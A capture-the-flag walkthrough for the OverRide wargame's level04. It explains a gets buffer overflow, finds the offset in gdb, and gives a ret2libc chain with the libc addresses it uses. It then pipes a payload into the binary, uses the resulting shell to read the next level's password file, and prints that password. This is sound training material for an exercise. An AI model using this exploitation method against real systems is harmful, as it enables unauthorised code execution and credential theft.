# level04 walkthrough

## the binary
``` shell
level04@OverRide:~$ ./level04 
Give me some shellcode, k
k
child is exiting...
```

## methodology
- ret2libc attack

The `gets` function is vulnerable to a buffer overflow, which allows us to perform a ret2libc attack. Calculating the offset is tricky because a child process is created in the `main` function, and there’s no way for a segmentation fault to occur since the parent process is still waiting. However, we can bypass this issue with the following steps:
``` shell
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 5640]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 5640]
0x41326641 in ?? ()
```

Now for the ret2libc:
1. offset = 156 bytes ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
2. address of `system` = 0xf7e6aed0
3. address of `exit` = 0xf7e5eb70
4. address of `/bin/bash` = 0xf7f897ec

Our payload is generated using an attached script.

## flag
``` shell
level04@OverRide:~$ python /tmp/payload04.py > /tmp/flag4
level04@OverRide:~$ cat /tmp/flag4 - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
